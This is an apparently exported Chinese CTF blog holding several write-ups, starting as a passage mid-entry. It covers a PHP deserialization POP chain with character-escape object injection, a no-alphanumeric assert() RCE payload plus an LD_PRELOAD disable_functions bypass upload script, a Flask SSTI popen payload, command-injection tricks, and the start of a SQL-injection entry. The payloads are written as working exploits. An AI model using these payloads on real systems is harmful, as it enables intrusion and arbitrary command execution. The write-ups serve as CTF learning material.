@<span class="token variable">$player</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"caches/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$player</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$player</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>class.php定义了一系列类</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">player</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">topsolo</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'Riven'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token keyword">or</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>
            <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">midsolo</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">!==</span> <span class="token string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'Yasuo'</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"No Yasuo! No Soul!\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"Are you orphan?\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"Must Be Yasuo!\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">jungle</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"Lee Sin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>common.php提供三个工具函数</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\0*\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"*"</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"*"</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0*\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Name Pass\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>反序列化的pop链很简单</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$jungle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jungle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mid</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">midsolo</span><span class="token punctuation">(</span><span class="token variable">$jungle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$top</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">topsolo</span><span class="token punctuation">(</span><span class="token variable">$mid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>topsolo的析构函数进TP()，调用midsolo，进invoke，invoke进Gank，在stristr进jungle的toString，获取flag，但是有几个需要绕过的点</p>
<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>这个很简单，考过无数次了，只需要把对象的对象数改成错的值就可以了</p>
<h3 id="check绕过"><a href="#check绕过" class="headerlink" title="check绕过"></a>check绕过</h3><p>check函数要求字符串中不能出现name字段，而我们pop链中这几个类的成员变量名均为name，正常的payload通过检测，需要使用技巧<br>PHP序列化中存在序列化类型S(大写)，相较于小写的s，大写S是escaped字符串，会将\xx形式作为一个十六进制字符处理，n的十六进制是6e，所以把name替换为\6eame即可绕过，这里就需要把\0*\0替换为\00*\00，实现对protected对象的描述<br>如下所示<br><code>S:7:&quot;\00*\00\6eame&quot;;</code>同样能够解析为protected $name;</p>
<h3 id="对象逃逸"><a href="#对象逃逸" class="headerlink" title="对象逃逸"></a>对象逃逸</h3><p>因为序列化是通过username和password序列化出了一个player对象，完全无法获得我们所需要的几个类，但是看到write函数和read函数，本意是将不可见字符转换为可见字符进行存储，但是write和read函数导致了字符长度发生了变化。<br>如果我们之间写入\0*\0这样的内容，那么在read函数中就会把五个字符转换成三个字符，导致反序列化失败，同理也可以使得字符逃逸出来，构造出新的对象<br>令username为一长串\0*\0，这样子就可以吞下足够多的字符，使得后面的内容逃逸出来<br>username&#x3D;<code>\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</code><br>password&#x3D;<code>;s:7:&quot;\0*\0pass&quot;;O:7:&quot;topsolo&quot;:2:&#123;S:7:&quot;\0*\0\6eame&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\0*\0\6eame&quot;;O:6:&quot;jungle&quot;:2:&#123;S:7:&quot;\0*\0\6eame&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</code><br>这样子序列化出来的数据为<br><code>O:6:&quot;player&quot;:3:&#123;s:7:&quot;\0*\0user&quot;;s:55:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&quot;;s:7:&quot;\0*\0pass&quot;;s:144:&quot;;s:7:&quot;\0*\0pass&quot;;O:7:&quot;topsolo&quot;:2:&#123;S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:2:&#123;S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&quot;;s:8:&quot;\0*\0admin&quot;;i:0;&#125;</code><br>username在反序列化是被缩短，所以s:55会吞下其后的<code>&quot;;s:7:&quot;\0*\0pass&quot;;s:144:</code>，导致后面构造出的对象逃逸出来，造成反序列化</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 RCE ME</title>
    <url>/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5D%20RCE%20ME.html</url>
    <content><![CDATA[<h1 id="极客大挑战-RCE-ME"><a href="#极客大挑战-RCE-ME" class="headerlink" title="极客大挑战 RCE ME"></a>极客大挑战 RCE ME</h1><p>三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function<br>当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍</p>
<h2 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9];+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// ?></span>
</code></pre>
<p>相比于SUCTF的命令执行简单了很多，直接使用取反~就能节约很多字符，也没有对使用字符种类的限制，可以直接构造简单的执行语句<br>var_dump(scandir(‘&#x2F;‘));扫描目录发现根目录下有flag文件和readflag，直接读读不出来没权限，那么就是需要执行readflag了，但是从phpinfo里面可以看到禁止了能用的所有执行命令行的函数，但是有一个assert可以用，就构造一个assert($_GET[_];)进行命令执行，跳出长度限制，任意执行命令</p>
<h3 id="可能的小坑"><a href="#可能的小坑" class="headerlink" title="可能的小坑"></a>可能的小坑</h3><p>这里的eval($code)和eval($_GET[code];)是不一样的，前者如果我们想要code&#x3D;$_GET[a];;&amp;a&#x3D;func()是不能执行函数的，后端只会获得一个a&#x3D;func()的变量，只有当code&#x3D;$_GET[a];();&amp;a&#x3D;func才行，变量名后面接括号将会被认为是一个<strong>可变函数</strong>，从而完成执行，PHP7允许可变函数带参数。但是我们这里再构造一层assert($_GET[_];)，就又跳了出来，回到了前者的情况，就能绕过判断进行任意命令执行了</p>
<p>eval，echo等语句并不能以可变函数的形式被调用，因为他们是一个语言结构，在PHP7中，assert也变为了一个语言结构，具体可以看这篇文章<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a><br><a href="https://www.sohu.com/a/302465075_750628">https://www.sohu.com/a/302465075_750628</a></p>
<p>函数名需要用括号括一下，尤其是像上述var_dump这样还有函数嵌套的，括号要括对。<br>这里之前看别人的payload，他将美元符号$也通过取反编码传入，这样子的话后端只能获得一个内容为$_GET[_];的字符串，自然无法执行命令，而我们传入一个美元符号，后端自然会认为这个是一个变量进一步解析，就能实现一个$_GET的功能。</p>
<p>到目前的payload： <code>?code=(~%9E%8C%8C%9A%8D%8B)($&#123;~%A0%B8%BA%AB&#125;[_];);</code> 即assert($_GET[_];)</p>
<p>这里测试了一下用eval($_GET[_];)就不行，也不知道为什么，只能用assert</p>
<h2 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h2><p>bypass disable_function已经是一个老生常谈了，通过LD_PRELOAD加载恶意.so动态链接库来进行劫持是一个常用方法，当然也不一定万用(以前还试过自己手动gcc编译一个动态链接库)，现在直接用GitHub现成项目就行，md里面也简要介绍了LD_PRELOAD是怎么绕过disable_function进行命令执行的<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>还有一个json的，没怎么仔细看，顺手贴一下，只适用于php7<br><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<p>当然问题在于怎么上传，上次就是卡在这了，这把想直接构造后门蚁剑连一下也没成。<br>被迫学习了手搓文件上传，用$FILE这个超全局变量来获取上传的文件，通过move_uploaded_file上传函数文件，由于没有open_basedir，我们之间把文件写在稳定有访问权限的&#x2F;tmp目录下最为稳妥(据说答题现场这个目录下一堆木马)，用python的request库post方法实现上传，然后执行命令包含&#x2F;tmp下的php文件，并加载动态链接库即可绕过disable_function，执行readflag拿到flag了<br>贴一下脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_];);&amp;_=move_uploaded_file($_FILES['file'];['tmp_name'];, '/tmp/z3ratu1.so');"</span>
evil_so <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc_x64.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
evil_php <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>


files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.so'</span><span class="token punctuation">,</span> evil_so<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_];);&amp;_=move_uploaded_file($_FILES['file'];['tmp_name'];, '/tmp/z3ratu1.php');"</span>

files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.php'</span><span class="token punctuation">,</span> evil_php<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>一开始传半天传不上去，检查了好几遍，又是分号没写又是引号没加的，丢人</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>bypass_disable_function</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>[祥云杯2020]云比赛记录</title>
    <url>/%5B%E7%A5%A5%E4%BA%91%E6%9D%AF2020%5D%E4%BA%91%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95.html</url>
    <content><![CDATA[<h1 id="祥云杯2020-云比赛记录"><a href="#祥云杯2020-云比赛记录" class="headerlink" title="[祥云杯2020]云比赛记录"></a>[祥云杯2020]云比赛记录</h1><p>前两天祥云杯师傅们大力输出，我大力划水看了一个题，今天比赛结束看wp开始学习</p>
<p>学习之前先批评一下这个比赛的py程度，可能是20w的烂钱太过诱人，导致大家的py程度前所未有的高，py的具体内容见这篇知乎回答<br><img src="/images/2020%E7%A5%A5%E4%BA%91%E6%9D%AF/mbg.jpg" alt="mbg.jpg"></p>
<h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>是先猜数字再SSTI，SSTI经典过滤，然后额外过了了通配符和flag<br>猜数字是在限制范围内二分猜50次，理论上必然猜对<br>但是我可以直接进行一个NAN的输入，很有意思的是NAN不大于任何数，也不小于任何数，但你把它当数字输入也不报错，这样子就直接过了猜数字<br>SSTI只会抄payload，过滤了一下没调通，抄的任意文件读能用，读了下源码看过滤，flag位置没找到，还是要拼字符串去执行命令<br>经典字符串加法过过滤<br><code>{{joiner.__init__.__globals__.__builtins__['__impo'+'rt__']('o'+'s')['po'+'pen']('c'+'at /super_secret_fl'+'ag.txt').read()}}</code></p>
<h3 id="学习点"><a href="#学习点" class="headerlink" title="学习点"></a>学习点</h3><p>之前猜数字乱输的时候会报错，进debug界面，看了null的wp，任意文件读就可以直接读log文件获取PIN码，在debug界面直接RCE<br>这里读的是&#x2F;var&#x2F;log&#x2F;app.log<br>不过这个是log默认目录吗，还是看了proc的cmdline知道log写到这了？</p>
<h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>经典命令注入，过滤比较多，可以使用经典管道符加base64命令执行<br>学习到的新技巧：</p>
<h3 id="xargs参数输入"><a href="#xargs参数输入" class="headerlink" title="xargs参数输入"></a>xargs参数输入</h3><p>如果直接输入<code>echo L2ZsYWc=|base64 -d|/bi?/ca?</code>的话，等于是使用无参数的cat命令，echo的内容是在管道符中是以标准输入的形式传递的，可以在命令行里测试，这种情况下cat将会读取标准输入进行输出，就是输入什么输出什么，完全不能读文件</p>
<pre class=" language-shell"><code class="language-shell">root@myserver:~# echo L2ZsYWc=|base64 -d|/bi?/ca?
/flagroot@myserver:~#
</code></pre>
<p>菜鸟教程的xargs简介有这么一句话，很直白</p>
<blockquote>
<p>之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数，而日常工作中有有这个必要</p>
</blockquote>
<p>所以需要使用这个xargs命令，这个命令将标准输入作为命令行参数输入，这样子我们执行的命令就是<code>cat /flag</code>，而不是<code>cat</code>再标准输入flag了</p>
<pre class=" language-shell"><code class="language-shell">root@myserver:~# echo L2ZsYWc=|base64 -d|xargs /bi?/ca?
flag{test}root@myserver:~#
</code></pre>
<p>~~比赛没打，后来看其他队伍的WP，好像`反引号也没过滤，那样的话就不需要xargs也行吧</p>
<h3 id="sed读取文件"><a href="#sed读取文件" class="headerlink" title="sed读取文件"></a>sed读取文件</h3><p>这个东西我真的不会用。。。印象里是个很难用的文本编辑软件，按行数或者规则增删查改之类的<br>但是还可以读文件真是太牛逼了</p>
<pre class=" language-shell"><code class="language-shell">root@myserver:~# sed '' /flag
flag{test}root@myserver:~#
</code></pre>
<p>trick+1</p>
<p>剩下的题目没看云了也没用，咕咕咕</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>cmdline</tag>
      </tags>
  </entry>
  <entry>
    <title>[美团CTF2021]wp</title>
    <url>/%5B%E7%BE%8E%E5%9B%A2CTF2021%5Dwp.html</url>
    <content><![CDATA[<h1 id="美团CTF2021-wp"><a href="#美团CTF2021-wp" class="headerlink" title="[美团CTF2021]wp"></a>[美团CTF2021]wp</h1><p>四个web，第一题被队友秒了，第二个不会对着复现了，第三个cms找到了可能的源码但是审不出来什么东西，第四个xxe但是没打通</p>
<p>看vn的wp，太牛逼了，四个大一大二的打到第一，估计是一个人就ak了web，我太垃圾了</p>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>SQL注入，ban了select，binary大小写区分直接if判断当前表下面的password字段注出来</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>有前台和后台，前台登录在密码处没过滤引号，后台过滤拉满<br>前台注入得到admin的password，登录后台<br>后台有注释admin.rar是源码（一开始没看见测了半天上传。。。。）<br>源码一个preload.php可以写文件但是超级过滤，upload.php可以上传但是没什么用，cli.php也不知道有什么用，hack.php用来写文件</p>
<p>贴一下preload.php，关键逻辑就这段</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">preload</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$method</span><span class="token punctuation">;</span>
